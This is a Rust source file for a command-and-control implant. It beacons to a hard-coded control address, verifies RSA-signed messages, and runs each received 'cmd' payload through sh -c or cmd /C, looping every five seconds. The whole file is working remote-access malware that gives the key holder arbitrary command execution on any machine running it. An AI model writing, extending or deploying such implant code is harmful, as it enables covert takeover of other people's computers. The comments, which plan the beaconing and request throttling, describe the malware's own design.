use tokio::net::{TcpStream};
use std::process::Command;
use rsa::signature::Verifier;
use std::error::Error;
use tokio::time::{Duration, sleep};
use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
use rsa::{RsaPublicKey, Pkcs1v15Encrypt};
use rsa::pkcs1::{DecodeRsaPublicKey};
use rsa::pkcs1v15::{VerifyingKey, Signature};
use rsa::sha2::{Digest, Sha256};


const CONTROL: &str = "127.0.0.1:8080";
const RSA_PUB_PEM: &str = "-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEA1KBXWBk/GxsfTWhKTSUp7SB/M+cE9vQHVYaeRgtzN4t430JbmUbU
3bMVusTc5FzE659d7JFpFmEV1jQuuscwarBtG4LTsgRzm/WntGlXLXqCLlr/lka0
1f5Lc+myAWj+fVGmFJArC20cdo2KEJXVnQnm9VYzUI0yz9Y0lyvBJYCoYqoXmX+Z
JE6D/VrgZY5XSmeiDUeV5W8+wFUj7VE89B9agzKXjz3K1xUsrz7Q5Ri9XQ+F7ouL
ghP0P975jWSP2sHbRdtXSei7zb4baGOiOe/7mH1/xUSGmxyHuQlc0haOGUXC7jxT
2jefOObS8Jry+lGlMMYpWSa5YazWBF+wnwIDAQAB
-----END RSA PUBLIC KEY-----";

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
   // We ideally want to do the following things here
   // 1. Connect to the server if not already connection
   // 2. Send a ping message to the server
   // 3. Recieve command from the control server
   // 4. Sleep to slow down requests
   // Now, we must also decrypt server messages.
   
   let public_key = RsaPublicKey::from_pkcs1_pem(RSA_PUB_PEM).unwrap();
   let verify_key = VerifyingKey::<Sha256>::new(public_key);

    loop {
        let mut stream = get_stream().await;
        let (mut reader, mut writer) = stream.split();
        if let Err(_) = writer.write_all(b"Hello!").await {
            writer.shutdown().await;
            continue;
        }
            
        let mut buf = vec![0u8; 1024];

        // Message
        
        let message_length = match reader.read_exact(&mut buf).await {
            Ok(n) => n,
            Err(_) => {
                writer.shutdown().await;
                continue;
            }
        };

        // Signed Message
        
        let mut signature_buf = vec![0u8; 256];

        if let Err(_) = reader.read(&mut signature_buf).await {
            writer.shutdown().await;
        }

        let signature = Signature::try_from(&signature_buf[..]).expect("Failed to get signature from bytes");

        if let Err(e) = verify_key.verify(&buf[..message_length], &signature) {
            eprintln!("{}", e);
            continue;
        }

        let command = String::from_utf8(buf).expect("Bad utf8"); // Make this not unwrap, just continue
        let command = command.trim_matches(char::from(0));
        println!("Message from control: {}", &command[..]);
        handle_command(command.to_string()).await;

        writer.shutdown().await;

        // Now lets handle our command.
        
        sleep(Duration::from_millis(5000)).await;
    }
}

async fn get_stream() -> TcpStream {
    loop {
        match TcpStream::connect(CONTROL).await {
            Ok(s) => return s,
            Err(_) => {
                sleep(Duration::from_millis(5000));
            }
        }
    }
}

async fn handle_command(command: String) {
    let (command, args) = match command.split_once(" ") {
        Some((c, a)) => (c, a),
        None => (&command[..], ""),
    };

    match command {
        "cmd" => {
            println!("Command running!");
            if cfg!(target_os = "windows") {
                Command::new("cmd")
                    .args(["/C", args])
                    .spawn()
                    .expect("Command err");
            } else {
                Command::new("sh")
                    .arg("-c")
                    .arg(args)
                    .spawn()
                    .expect("Command err");
            }
        },
        &_ => (),
    }
}
